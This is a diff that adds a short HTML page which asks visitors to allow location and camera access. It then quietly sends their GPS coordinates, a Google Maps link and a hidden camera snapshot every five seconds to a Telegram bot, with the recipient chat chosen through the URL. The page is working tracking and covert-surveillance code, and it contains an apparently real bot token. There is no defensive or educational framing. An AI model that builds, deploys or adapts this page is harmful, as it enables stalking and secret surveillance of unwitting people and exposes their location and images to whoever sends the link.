@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h3>Allow Location and Camera Access</h3>
+    <p>Click "Allow" for both to share your location and live photos.</p>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <p id="status">Waiting for permissions...</p>
+
+    <script>
+        const botToken = "7766871169:AAHWWs9KpQl_b3hVOkKWLnU66XFpYBo3hD8"; // Replace with your BotFather token
+        const telegramApi = `https://api.telegram.org/bot${botToken}/`;
+        const chatId = new URLSearchParams(window.location.search).get("chat_id");
+        const status = document.getElementById("status");
+
+        // Send geolocation once
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                const message = `Location: ${lat}, ${lng}\nGoogle Maps: ${mapsLink}`;
+                fetch(`${telegramApi}sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                status.innerText = "Location sent! Now sending live photos...";
+            }, error => {
+                status.innerText = "Location access denied.";
+            });
+        }
+
+        // Set up camera and send photos every 5 seconds
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                sendLocation(); // Send location once camera is ready
+
+                // Capture and send photo every 5 seconds
+                setInterval(() => {
+                    context.drawImage(video, 0, 0, 320, 240);
+                    const photoData = canvas.toDataURL("image/jpeg");
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", dataURLtoBlob(photoData), "photo.jpg");
+
+                    fetch(`${telegramApi}sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    }).then(() => {
+                        status.innerText = "Photo sent! Updating every 5 seconds...";
+                    }).catch(() => {
+                        status.innerText = "Error sending photo.";
+                    });
+                }, 5000);
+            })
+            .catch(err => {
+                status.innerText = "Camera access denied.";
+            });
+
+        // Convert base64 data URL to Blob for Telegram API
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
